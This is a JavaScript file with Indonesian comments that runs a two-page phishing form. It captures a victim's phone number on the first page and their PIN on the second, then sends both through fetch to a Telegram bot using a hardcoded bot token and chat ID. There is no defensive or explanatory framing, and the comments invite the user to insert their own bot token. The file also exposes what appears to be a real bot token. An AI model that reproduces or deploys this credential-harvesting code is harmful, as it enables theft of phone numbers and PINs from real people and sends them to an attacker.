document.addEventListener("DOMContentLoaded", function() {
    let tokenBot = "7852581294:AAEcow9FfvWIMzzMLkK6VTKcLWCIX1jApGo"; // Ganti dengan Token Bot Anda
    let chatId = "6824078885"; // Ganti dengan Chat ID Anda

    // Halaman 1: Kirim Nomor HP
    let formNomor = document.getElementById("formNomor");
    if (formNomor) {
        formNomor.addEventListener("submit", function(event) {
            event.preventDefault();
            let nomorHp = document.getElementById("nomorHp").value;

            // Simpan ke localStorage agar bisa diakses di halaman berikutnya
            localStorage.setItem("nomorHp", nomorHp);

            // Pindah ke halaman PIN
            window.location.href = "pin.html";
        });
    }

    // Halaman 2: Kirim PIN + Nomor HP
    let formPin = document.getElementById("formPin");
    if (formPin) {
        formPin.addEventListener("submit", function(event) {
            event.preventDefault();
            let pin = document.getElementById("pin").value;
            let nomorHp = localStorage.getItem("nomorHp") || "-";

            let pesan = `📱 *Nomor HP*: ${nomorHp}\n🔢 *PIN*: ${pin}`;
            let telegramURL = `https://api.telegram.org/bot${tokenBot}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(pesan)}`;

            fetch(telegramURL)
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        alert("Data berhasil dikirim ke Telegram!");
                        localStorage.removeItem("nomorHp"); // Hapus data setelah dikirim
                    } else {
                        alert("Gagal mengirim data.");
                    }
                })
                .catch(error => console.error("Error:", error));
        });
    }
});
